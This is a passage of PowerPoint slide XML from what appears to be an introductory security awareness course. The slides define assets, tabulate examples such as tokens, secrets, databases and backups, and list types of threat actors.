              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1605544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BD4A-ACE6-9A60-D247-475841ED78F8}"/>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675C3B7C-7090-AF87-F9CD-6C02BE2528C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Pop Quiz – What separates a bug, error, or technical issue from a genuine security incident?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="773383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8AE1-1950-2A27-0F8D-C2339025A399}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Assets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63C58D9A-287C-50FD-AC94-21CE2D34B74E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="10515600" cy="4544027"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>What counts as an asset?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Anything with value to your org or attackers that could be harmed if disclosed, changed, or made unavailable: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Identities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Infrastructure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Money flows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Even trust signals (like signatures and logs)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2759414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34538-0193-0C61-B190-FE0B7C72A5E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - Asset examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64F88FBC-F857-3515-E4FC-0FDB00C6E966}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="233084767"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="838200" y="1825625"/>
          <a:ext cx="10515595" cy="4541520"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5940675A-B579-460E-94D1-54222C63F5DA}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2103119">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1840521950"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2103119">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3839302307"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2103119">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3922555124"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2103119">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1885009925"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2103119">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3969953466"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="755817">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="0" algn="ctr">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Code &amp; Build Artifacts</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="0" algn="ctr">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Identities &amp; Access Tokens</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="0" algn="ctr">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Secrets &amp; Cryptographic Materials</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="0" algn="ctr">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Data &amp; Records</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" b="1"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr lvl="0" algn="ctr">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Storage Systems</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3126785822"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="3245570">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Source code</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0" err="1"/>
                        <a:t>IaC</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t> templates</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Compiled binaries</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Container images</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Mobile app packages</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>User accounts</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Service accounts</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>OAuth tokens</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Session IDs</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="285750" lvl="0" indent="-285750">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>API keys</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>App secrets</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Credentials</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>Private keys</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>KMS policies</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0"/>
                        <a:t>TLS materials</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>PII</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>payment data</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>health data</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>usage analytics</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>internal docs</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Schemas</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>backups</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Databases</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>object stores</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>Caches</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>search indexes</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200"/>
                    </a:p>
                    <a:p>
                      <a:pPr marL="342900" lvl="0" indent="-342900">
                        <a:buFont typeface="Arial"/>
                        <a:buChar char="•"/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2200" b="0" i="0" u="none" strike="noStrike" noProof="0" dirty="0">
                          <a:latin typeface="Aptos"/>
                        </a:rPr>
                        <a:t>local files</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2759717477"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="84583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18B4-2F9D-D3B5-8B22-87A430D6C772}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.1 - Threat Actors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60E39CD8-5D11-4FD0-31F2-E3E8A304A990}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Threat Actors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – Who wants to get in?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Script kiddies / opportunists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Insiders</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Hacktivists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cyber gangs/terrorists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Nation states / APTs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
